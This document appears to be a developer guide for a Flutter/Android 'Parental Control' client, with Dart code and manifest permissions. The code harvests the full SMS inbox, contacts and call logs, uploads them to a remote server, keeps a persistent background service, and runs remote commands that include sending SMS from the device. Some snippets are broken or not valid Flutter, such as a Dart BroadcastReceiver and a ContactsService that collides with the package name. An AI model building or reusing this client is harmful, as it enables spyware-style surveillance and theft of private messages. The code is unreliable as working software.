# ?? Flutter/Android App Development Guide

Complete guide for developing the Flutter/Android application that connects to the Parental Control Backend Server.

---

## ?? Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Setup & Prerequisites](#setup--prerequisites)
4. [Server Communication](#server-communication)
5. [API Integration](#api-integration)
6. [WebSocket Connection](#websocket-connection)
7. [Firebase FCM Setup](#firebase-fcm-setup)
8. [Required Updates](#required-updates)
9. [Example Code](#example-code)
10. [Testing](#testing)

---

## ?? Overview

The Flutter/Android app is a monitoring client that:
- Registers with the backend server using an admin token
- Maintains real-time WebSocket connection
- Uploads device data (SMS, contacts, calls)
- Receives and executes remote commands
- Sends notifications via Firebase FCM

---

## ??? Architecture

```
???????????????????????????????????????
?        Flutter/Android App          ?
?  ?????????????????????????????????  ?
?  ?   Background Service          ?  ?
?  ?   (WorkManager/Foreground)    ?  ?
?  ?????????????????????????????????  ?
?            ?                         ?
?  ?????????????????????????????????  ?
?  ?   WebSocket Manager           ?  ?
?  ?   - Persistent connection     ?  ?
?  ?   - Auto-reconnect            ?  ?
?  ?   - Heartbeat                 ?  ?
?  ?????????????????????????????????  ?
?            ?                         ?
?  ?????????????????????????????????  ?
?  ?   Data Collectors             ?  ?
?  ?   - SMS Monitor               ?  ?
?  ?   - Call Log Monitor          ?  ?
?  ?   - Contacts Monitor          ?  ?
?  ?   - Battery Monitor           ?  ?
?  ?????????????????????????????????  ?
?            ?                         ?
?  ?????????????????????????????????  ?
?  ?   Firebase FCM                ?  ?
?  ?   - Command receiver          ?  ?
?  ?   - Push notifications        ?  ?
?  ?????????????????????????????????  ?
???????????????????????????????????????
           ?
           ? HTTP/WebSocket
           ?
???????????????????????????????????????
?         Backend Server              ?
?  - REST API                         ?
?  - WebSocket                        ?
?  - MongoDB                          ?
?  - Firebase Admin SDK               ?
???????????????????????????????????????
```

---

## ?? Setup & Prerequisites

### Required Packages

Add to `pubspec.yaml`:

```yaml
dependencies:
  flutter:
    sdk: flutter
  
  # HTTP & WebSocket
  http: ^1.1.0
  web_socket_channel: ^2.4.0
  
  # Firebase
  firebase_core: ^2.24.0
  firebase_messaging: ^14.7.0
  
  # Background service
  workmanager: ^0.5.1
  flutter_foreground_task: ^6.0.0
  
  # Permissions
  permission_handler: ^11.0.1
  
  # Device info
  device_info_plus: ^9.1.0
  package_info_plus: ^5.0.1
  
  # SMS & Contacts
  telephony: ^0.2.0
  contacts_service: ^0.6.3
  call_log: ^4.0.0
  
  # Battery
  battery_plus: ^5.0.2
  
  # Local storage
  shared_preferences: ^2.2.2
  
  # State management
  provider: ^6.1.1
```

### Android Permissions

Add to `AndroidManifest.xml`:

```xml
<manifest>
    <!-- Internet -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    
    <!-- SMS -->
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    
    <!-- Contacts -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    
    <!-- Call logs -->
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    
    <!-- Phone state -->
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    
    <!-- Battery -->
    <uses-permission android:name="android.permission.BATTERY_STATS" />
    
    <!-- Foreground service -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
    
    <application>
        <!-- Firebase Messaging Service -->
        <service
            android:name=".MyFirebaseMessagingService"
            android:exported="false">
            <intent-filter>
                <action android:name="com.google.firebase.MESSAGING_EVENT" />
            </intent-filter>
        </service>
    </application>
</manifest>
```

---

## ?? Server Communication

### Base Configuration

```dart
class ApiConfig {
  static const String baseUrl = 'http://your-server:8765';
  static const String wsUrl = 'ws://your-server:8765/ws';
  
  // Admin token (obtained when admin creates the device)
  static String? adminToken;
  
  // Device ID (unique identifier)
  static String? deviceId;
}
```

---

## ?? API Integration

### 1. Device Registration

**Endpoint:** `POST /register`

```dart
class DeviceService {
  Future<Map<String, dynamic>> registerDevice({
    required String deviceId,
    required Map<String, dynamic> deviceInfo,
    String? adminToken,
  }) async {
    final response = await http.post(
      Uri.parse('${ApiConfig.baseUrl}/register'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'device_id': deviceId,
        'device_info': deviceInfo,
        'admin_token': adminToken,
      }),
    );
    
    if (response.statusCode == 200) {
      return jsonDecode(response.body);
    } else {
      throw Exception('Failed to register device');
    }
  }
  
  Map<String, dynamic> getDeviceInfo() {
    return {
      'model': 'Samsung Galaxy S21',
      'manufacturer': 'Samsung',
      'osVersion': 'Android 13',
      'appVersion': '1.0.0',
      // Add more device info
    };
  }
}
```

### 2. Heartbeat

**Endpoint:** `POST /devices/heartbeat`

```dart
class HeartbeatService {
  Timer? _timer;
  
  void startHeartbeat(String deviceId) {
    _timer = Timer.periodic(Duration(seconds: 30), (timer) async {
      try {
        await http.post(
          Uri.parse('${ApiConfig.baseUrl}/devices/heartbeat'),
          headers: {'Content-Type': 'application/json'},
          body: jsonEncode({'deviceId': deviceId}),
        );
        print('? Heartbeat sent');
      } catch (e) {
        print('? Heartbeat failed: $e');
      }
    });
  }
  
  void stopHeartbeat() {
    _timer?.cancel();
  }
}
```

### 3. SMS Upload

**Endpoint:** `POST /sms/batch`

```dart
class SmsService {
  Future<void> uploadSms(String deviceId, List<Map<String, dynamic>> smsList) async {
    final response = await http.post(
      Uri.parse('${ApiConfig.baseUrl}/sms/batch'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'device_id': deviceId,
        'data': smsList,
        'batch_info': {
          'batch': 1,
          'of': 1,
        },
      }),
    );
    
    if (response.statusCode == 200) {
      print('? SMS uploaded successfully');
    }
  }
  
  Future<List<Map<String, dynamic>>> getAllSms() async {
    // Use telephony package
    final messages = await Telephony.instance.getInboxSms();
    
    return messages.map((msg) => {
      'from': msg.address ?? '',
      'body': msg.body ?? '',
      'timestamp': msg.date?.millisecondsSinceEpoch,
      'type': 'inbox',
    }).toList();
  }
}
```

### 4. New SMS Notification

**Endpoint:** `POST /api/sms/new`

```dart
class SmsReceiver extends BroadcastReceiver {
  @override
  Future<void> onReceive(Context context, Intent intent) async {
    final messages = Telephony.instance.getMessagesFromIntent(intent);
    
    for (var message in messages) {
      await http.post(
        Uri.parse('${ApiConfig.baseUrl}/api/sms/new'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'device_id': ApiConfig.deviceId,
          'data': {
            'from': message.address,
            'body': message.body,
            'timestamp': message.date,
          },
        }),
      );
    }
  }
}
```

### 5. Contacts Upload

**Endpoint:** `POST /contacts/batch`

```dart
class ContactsService {
  Future<void> uploadContacts(String deviceId) async {
    final contacts = await ContactsService.getContacts();
    
    final contactsList = contacts.map((contact) => {
      'name': contact.displayName ?? '',
      'phone_number': contact.phones?.first.value ?? '',
    }).toList();
    
    await http.post(
      Uri.parse('${ApiConfig.baseUrl}/contacts/batch'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'device_id': deviceId,
        'data': contactsList,
      }),
    );
  }
}
```

### 6. Call Logs Upload

**Endpoint:** `POST /call-logs/batch`

```dart
class CallLogsService {
  Future<void> uploadCallLogs(String deviceId) async {
    final entries = await CallLog.get();
    
    final callLogs = entries.map((call) => {
      'number': call.number,
      'name': call.name ?? 'Unknown',
      'call_type': call.callType.toString(),
      'timestamp': call.timestamp,
      'duration': call.duration,
    }).toList();
    
    await http.post(
      Uri.parse('${ApiConfig.baseUrl}/call-logs/batch'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'device_id': deviceId,
        'data': callLogs,
      }),
    );
  }
}
```

### 7. Battery Status

**Endpoint:** `POST /battery`

```dart
class BatteryService {
  Future<void> sendBatteryStatus(String deviceId) async {
    final battery = Battery();
    final batteryLevel = await battery.batteryLevel;
    
    await http.post(
      Uri.parse('${ApiConfig.baseUrl}/battery'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'device_id': deviceId,
        'data': {
          'battery': batteryLevel,
          'is_online': true,
        },
      }),
    );
  }
}
```

---

## ?? WebSocket Connection

### WebSocket Manager

```dart
class WebSocketManager {
  WebSocketChannel? _channel;
  String? deviceId;
  Timer? _pingTimer;
  
  Future<void> connect(String deviceId) async {
    this.deviceId = deviceId;
    
    try {
      final wsUrl = '${ApiConfig.wsUrl}?device_id=$deviceId';
      _channel = WebSocketChannel.connect(Uri.parse(wsUrl));
      
      print('? WebSocket connected');
      
      // Listen for messages
      _channel!.stream.listen(
        _onMessage,
        onError: _onError,
        onDone: _onDisconnect,
      );
      
      // Start ping
      _startPing();
      
    } catch (e) {
      print('? WebSocket connection failed: $e');
      // Retry after delay
      Future.delayed(Duration(seconds: 5), () => connect(deviceId));
    }
  }
  
  void _onMessage(dynamic message) {
    print('?? Received: $message');
    final data = jsonDecode(message);
    
    // Handle different message types
    switch (data['type']) {
      case 'ping':
        _sendPong();
        break;
      case 'command':
        _handleCommand(data);
        break;
      // Add more handlers
    }
  }
  
  void _onError(error) {
    print('? WebSocket error: $error');
  }
  
  void _onDisconnect() {
    print('?? WebSocket disconnected');
    _pingTimer?.cancel();
    // Reconnect
    Future.delayed(Duration(seconds: 5), () => connect(deviceId!));
  }
  
  void _startPing() {
    _pingTimer = Timer.periodic(Duration(seconds: 30), (timer) {
      send({'type': 'ping'});
    });
  }
  
  void _sendPong() {
    send({'type': 'pong'});
  }
  
  void _handleCommand(Map<String, dynamic> data) {
    // Handle remote commands
    final command = data['command'];
    print('? Executing command: $command');
    
    // Execute command based on type
    // ...
  }
  
  void send(Map<String, dynamic> data) {
    _channel?.sink.add(jsonEncode(data));
  }
  
  void disconnect() {
    _pingTimer?.cancel();
    _channel?.sink.close();
  }
}
```

---

## ?? Firebase FCM Setup

### 1. Firebase Configuration

```dart
class FirebaseService {
  static Future<void> initialize() async {
    await Firebase.initializeApp();
    
    // Get FCM token
    final fcmToken = await FirebaseMessaging.instance.getToken();
    print('FCM Token: $fcmToken');
    
    // Save token to server
    await _saveFcmToken(fcmToken);
    
    // Listen for token refresh
    FirebaseMessaging.instance.onTokenRefresh.listen(_saveFcmToken);
    
    // Handle foreground messages
    FirebaseMessaging.onMessage.listen(_handleForegroundMessage);
    
    // Handle background messages
    FirebaseMessaging.onBackgroundMessage(_firebaseMessagingBackgroundHandler);
  }
  
  static Future<void> _saveFcmToken(String? token) async {
    if (token == null) return;
    
    await http.post(
      Uri.parse('${ApiConfig.baseUrl}/devices/${ApiConfig.deviceId}/fcm-token'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({'fcm_token': token}),
    );
  }
  
  static void _handleForegroundMessage(RemoteMessage message) {
    print('?? FCM Message: ${message.data}');
    
    // Handle command
    final command = message.data['command'];
    if (command != null) {
      _executeCommand(command, message.data);
    }
  }
  
  static void _executeCommand(String command, Map<String, dynamic> data) {
    switch (command) {
      case 'ping':
        // Send ping response
        _sendPingResponse();
        break;
      case 'send_sms':
        // Send SMS
        _sendSms(data['phone'], data['message']);
        break;
      case 'upload_sms':
        // Upload SMS
        _uploadSms();
        break;
      // Add more commands
    }
  }
  
  static Future<void> _sendPingResponse() async {
    await http.post(
      Uri.parse('${ApiConfig.baseUrl}/ping-response'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({'deviceId': ApiConfig.deviceId}),
    );
  }
  
  static Future<void> _sendSms(String phone, String message) async {
    await Telephony.instance.sendSms(
      to: phone,
      message: message,
    );
  }
}

// Background message handler (must be top-level function)
@pragma('vm:entry-point')
Future<void> _firebaseMessagingBackgroundHandler(RemoteMessage message) async {
  await Firebase.initializeApp();
  print('?? Background message: ${message.data}');
  // Handle background commands
}
```

---

## ?? Required Updates

### Updates needed in existing app:

1. **Server URL Configuration**
   - Update all hardcoded URLs to point to your server
   - Add configuration for development/production

2. **Authentication**
   - Implement admin token storage
   - Add token to all API requests

3. **WebSocket Integration**
   - Replace/update existing WebSocket implementation
   - Add auto-reconnect logic
   - Handle all message types

4. **FCM Integration**
   - Update Firebase configuration
   - Implement all command handlers
   - Test push notifications

5. **Data Upload**
   - Batch uploads for better performance
   - Add retry logic for failed uploads
   - Implement incremental sync

6. **Background Service**
   - Ensure service runs continuously
   - Add battery optimization exemption
   - Handle app restart

7. **Permissions**
   - Request all required permissions
   - Handle permission denials gracefully
   - Add settings deep-link

---

## ?? Example Code

### Complete Main App

```dart
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  // Initialize Firebase
  await FirebaseService.initialize();
  
  // Load device ID and token
  final prefs = await SharedPreferences.getInstance();
  ApiConfig.deviceId = prefs.getString('device_id') ?? _generateDeviceId();
  ApiConfig.adminToken = prefs.getString('admin_token');
  
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: HomePage(),
    );
  }
}

class HomePage extends StatefulWidget {
  @override
  _HomePageState createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  final DeviceService _deviceService = DeviceService();
  final WebSocketManager _wsManager = WebSocketManager();
  final HeartbeatService _heartbeat = HeartbeatService();
  
  @override
  void initState() {
    super.initState();
    _initialize();
  }
  
  Future<void> _initialize() async {
    // Request permissions
    await _requestPermissions();
    
    // Register device
    if (ApiConfig.adminToken != null) {
      await _deviceService.registerDevice(
        deviceId: ApiConfig.deviceId!,
        deviceInfo: _deviceService.getDeviceInfo(),
        adminToken: ApiConfig.adminToken,
      );
    }
    
    // Connect WebSocket
    await _wsManager.connect(ApiConfig.deviceId!);
    
    // Start heartbeat
    _heartbeat.startHeartbeat(ApiConfig.deviceId!);
    
    // Start background service
    await _startBackgroundService();
    
    // Initial data upload
    await _uploadInitialData();
  }
  
  Future<void> _requestPermissions() async {
    await [
      Permission.sms,
      Permission.contacts,
      Permission.phone,
      Permission.notification,
    ].request();
  }
  
  Future<void> _startBackgroundService() async {
    await FlutterForegroundTask.init(
      androidNotificationOptions: AndroidNotificationOptions(
        channelId: 'parental_control',
        channelName: 'Parental Control Service',
        channelImportance: NotificationChannelImportance.LOW,
      ),
    );
    
    await FlutterForegroundTask.startService(
      notificationTitle: 'Parental Control',
      notificationText: 'Monitoring in progress',
    );
  }
  
  Future<void> _uploadInitialData() async {
    // Upload SMS
    final smsService = SmsService();
    final smsList = await smsService.getAllSms();
    await smsService.uploadSms(ApiConfig.deviceId!, smsList);
    
    // Upload contacts
    await ContactsService().uploadContacts(ApiConfig.deviceId!);
    
    // Upload call logs
    await CallLogsService().uploadCallLogs(ApiConfig.deviceId!);
  }
  
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text('Parental Control')),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Text('Device ID: ${ApiConfig.deviceId}'),
            SizedBox(height: 20),
            ElevatedButton(
              onPressed: _uploadInitialData,
              child: Text('Upload Data'),
            ),
          ],
        ),
      ),
    );
  }
  
  @override
  void dispose() {
    _wsManager.disconnect();
    _heartbeat.stopHeartbeat();
    super.dispose();
  }
}

String _generateDeviceId() {
  return 'DEVICE_${DateTime.now().millisecondsSinceEpoch}';
}
```

---

## ?? Testing

### 1. Test Device Registration

```dart
void testRegistration() async {
  final service = DeviceService();
  try {
    final result = await service.registerDevice(
      deviceId: 'TEST_DEVICE_123',
      deviceInfo: {'model': 'Test'},
      adminToken: 'your_admin_token',
    );
    print('? Registration successful: $result');
  } catch (e) {
    print('? Registration failed: $e');
  }
}
```

### 2. Test WebSocket

```dart
void testWebSocket() async {
  final manager = WebSocketManager();
  await manager.connect('TEST_DEVICE_123');
  
  // Wait and test
  await Future.delayed(Duration(seconds: 5));
  
  // Send test message
  manager.send({'type': 'test', 'message': 'Hello'});
}
```

### 3. Test FCM

```bash
# Send test notification via Firebase Console
# or use curl:
curl -X POST https://fcm.googleapis.com/fcm/send \
  -H "Authorization: Bearer YOUR_SERVER_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "to": "DEVICE_FCM_TOKEN",
    "data": {
      "command": "ping"
    }
  }'
```

---

## ?? Checklist

- [ ] All required packages added to pubspec.yaml
- [ ] All permissions added to AndroidManifest.xml
- [ ] Firebase configured (google-services.json)
- [ ] Server URL configured
- [ ] Device registration implemented
- [ ] WebSocket connection implemented
- [ ] FCM setup complete
- [ ] SMS monitoring active
- [ ] Contacts sync working
- [ ] Call logs sync working
- [ ] Battery monitoring working
- [ ] Background service running
- [ ] Heartbeat sending
- [ ] All commands handled
- [ ] Error handling implemented
- [ ] Tested on real device

---

## ?? Useful Resources

- [FastAPI Documentation](https://fastapi.tiangolo.com/)
- [Flutter Documentation](https://flutter.dev/docs)
- [Firebase FCM Documentation](https://firebase.google.com/docs/cloud-messaging)
- [WebSocket API](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket)

---

**Need help? Check the main [README.md](./README.md) or open an issue!**
